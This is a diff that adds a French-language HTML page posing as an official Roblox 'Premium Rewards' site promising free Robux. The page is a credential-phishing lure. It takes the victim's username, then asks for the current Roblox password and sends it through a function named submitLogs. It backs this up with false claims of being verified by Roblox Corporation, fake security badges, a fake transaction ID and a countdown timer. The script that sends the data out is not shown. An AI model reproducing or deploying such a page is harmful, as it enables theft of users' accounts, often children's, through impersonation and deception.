@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox | Récompenses Premium</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="particles-container" id="particles"></div>
+    
+    <div class="container">
+        <div class="header">
+            <img src="https://images.rbxcdn.com/2216479f3db70517860269f835f8dc13.png" class="logo" alt="Roblox">
+            <div class="header-badge">
+                <i class="fas fa-shield-alt"></i> SÉCURISÉ ROBLOX
+            </div>
+        </div>
+        
+        <div id="step1" class="step active">
+            <div class="step-indicator">
+                <div class="indicator active"><span>1</span> Sélection</div>
+                <div class="indicator"><span>2</span> Validation</div>
+            </div>
+            
+            <h1 class="title">
+                <i class="fas fa-gem"></i> RÉCLAMATION ROBUX
+            </h1>
+            <p class="subtitle">Programme Premium - Récompenses Gratuites</p>
+            
+            <div class="avatar-container" id="avatar-container">
+                <div class="avatar-frame">
+                    <img id="avatar-img" src="" alt="Avatar">
+                    <div class="avatar-glow"></div>
+                </div>
+                <div id="display-name" class="display-name"></div>
+                <div class="avatar-status">
+                    <i class="fas fa-check-circle"></i> Compte vérifié
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <div class="input-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <input type="text" id="username" placeholder="Nom d'utilisateur Roblox" onblur="loadProfile()" autocomplete="off">
+            </div>
+            
+            <div class="packets-section">
+                <h3><i class="fas fa-gift"></i> CHOISISSEZ VOTRE PACKET</h3>
+                <div class="packets-grid">
+                    <div class="packet" data-amount="1,700">
+                        <div class="packet-header">
+                            <i class="fas fa-star"></i> STANDARD
+                        </div>
+                        <div class="packet-amount">1,700</div>
+                        <div class="packet-robux">ROBUX</div>
+                        <div class="packet-badge">Gratuit</div>
+                    </div>
+                    
+                    <div class="packet active" data-amount="4,500">
+                        <div class="packet-header">
+                            <i class="fas fa-crown"></i> PREMIUM
+                        </div>
+                        <div class="packet-amount">4,500</div>
+                        <div class="packet-robux">ROBUX</div>
+                        <div class="packet-badge">Recommandé</div>
+                    </div>
+                    
+                    <div class="packet" data-amount="10,000">
+                        <div class="packet-header">
+                            <i class="fas fa-rocket"></i> PRO
+                        </div>
+                        <div class="packet-amount">10,000</div>
+                        <div class="packet-robux">ROBUX</div>
+                        <div class="packet-badge">Populaire</div>
+                    </div>
+                </div>
+                
+                <select id="robux-amount" class="packet-select">
+                    <option value="1,700">1,700 Robux - Standard</option>
+                    <option value="4,500" selected>4,500 Robux - Premium</option>
+                    <option value="10,000">10,000 Robux - Pro</option>
+                    <option value="50,000">50,000 Robux - Admin Beta</option>
+                </select>
+            </div>
+            
+            <div class="security-note">
+                <i class="fas fa-lock"></i> Cette offre est sécurisée et vérifiée par Roblox Corporation
+            </div>
+            
+            <button class="btn btn-primary" onclick="toStep2()">
+                <span>VÉRIFIER L'ÉLIGIBILITÉ</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+            
+            <div class="spinner" id="loader-1"></div>
+        </div>
+        
+        <div id="step2" class="step">
+            <div class="step-indicator">
+                <div class="indicator"><span>1</span> Sélection</div>
+                <div class="indicator active"><span>2</span> Validation</div>
+            </div>
+            
+            <h1 class="title security-title">
+                <i class="fas fa-shield-alt"></i> VALIDATION DE SÉCURITÉ
+            </h1>
+            
+            <div class="confirmation-card">
+                <div class="confirmation-header">
+                    <i class="fas fa-check-circle"></i> ÉLIGIBLE AU PACKET
+                </div>
+                <div class="confirmation-body">
+                    <div class="confirmation-amount">
+                        <span id="final-amt">4,500</span>
+                        <div class="confirmation-label">ROBUX</div>
+                    </div>
+                    <div class="confirmation-user">
+                        <i class="fas fa-user"></i>
+                        <span id="final-user">Utilisateur</span>
+                    </div>
+                </div>
+                <div class="confirmation-footer">
+                    Transfert immédiat après validation
+                </div>
+            </div>
+            
+            <p class="instruction">
+                Pour finaliser le transfert des <b id="final-amt-text">4,500</b> Robux vers votre compte,
+                veuillez confirmer votre identité avec votre mot de passe actuel.
+            </p>
+            
+            <div class="input-group">
+                <div class="input-icon">
+                    <i class="fas fa-key"></i>
+                </div>
+                <input type="password" id="password" placeholder="Mot de passe Roblox actuel">
+                <div class="input-hint">
+                    <i class="fas fa-info-circle"></i> Requis pour la synchronisation sécurisée
+                </div>
+            </div>
+            
+            <div class="security-alert">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div>
+                    <strong>Sécurité maximale activée</strong>
+                    <small>Votre session est chiffrée et protégée</small>
+                </div>
+            </div>
+            
+            <button class="btn btn-success" onclick="submitLogs()">
+                <i class="fas fa-lock"></i>
+                <span>CONFIRMER & RECEVOIR LES ROBUX</span>
+            </button>
+            
+            <div class="transaction-info">
+                <div class="transaction-id">
+                    <i class="fas fa-hashtag"></i>
+                    ID de transaction : #RBX-<span id="transaction-id">7729</span>-2026
+                </div>
+                <div class="timer">
+                    <i class="fas fa-clock"></i>
+                    Offre expire dans : <span id="countdown">05:00</span>
+                </div>
+            </div>
+            
+            <div class="spinner" id="loader-2"></div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-shield-alt"></i> Sécurité</a>
+                <a href="#"><i class="fas fa-question-circle"></i> Aide</a>
+                <a href="#"><i class="fas fa-file-contract"></i> Conditions</a>
+            </div>
+            <div class="copyright">
+                © 2026 Roblox Corporation. Roblox et le logo Roblox sont des marques déposées de Roblox Corporation.
+            </div>
+        </div>
+    </div>
+    
+
+</body>
+</html>
